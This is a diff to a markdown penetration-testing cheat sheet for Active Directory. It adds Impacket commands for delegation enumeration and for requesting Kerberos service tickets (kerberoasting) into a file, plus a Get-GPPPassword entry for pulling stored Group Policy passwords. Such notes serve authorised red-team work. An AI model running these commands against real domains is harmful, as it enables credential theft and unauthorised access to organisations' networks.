@@ -163,6 +163,7 @@ Easy enumeration with **Impacket\FindDelegation.py**:
 ```bash
 # with password in the CLI
 zz=$zdom_fqdn'/'$ztarg_user_name':'$ztarg_user_pass 
+
 findDelegation.py  $zz -dc-ip $zdom_dc_ip
 
 # with kerberos auth / password not in the CLI
@@ -203,6 +204,7 @@ tbd
 #### <a name='shoot-spns'></a>shoot-spns
 ```
 # https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py
+GetUserSPNs.py $zdom_fqdn/$ztarg_user_name -k -no-pass -dc-ip $zdom_dc_ip -request >> tgs.txt
 GetUserSPNs.py $zdom_fqdn/$ztarg_user_name:$ztarg_user_pass -dc-ip $zdom_dc_ip -request >> tgs.txt
 ```
 
@@ -214,7 +216,10 @@ GetNPUsers.py $zdom_fqdn/$ztarg_user_name:$ztarg_user_pass -dc-ip $zdom_dc_ip -r
 
 #### <a name='shoot-acls'></a>shoot-acls
 
-
+#### <a name='shoot-acls'></a>shoot-gpos
+```
+Get-GPPPassword
+```
 
 ## <a name='iter'></a>iter
 
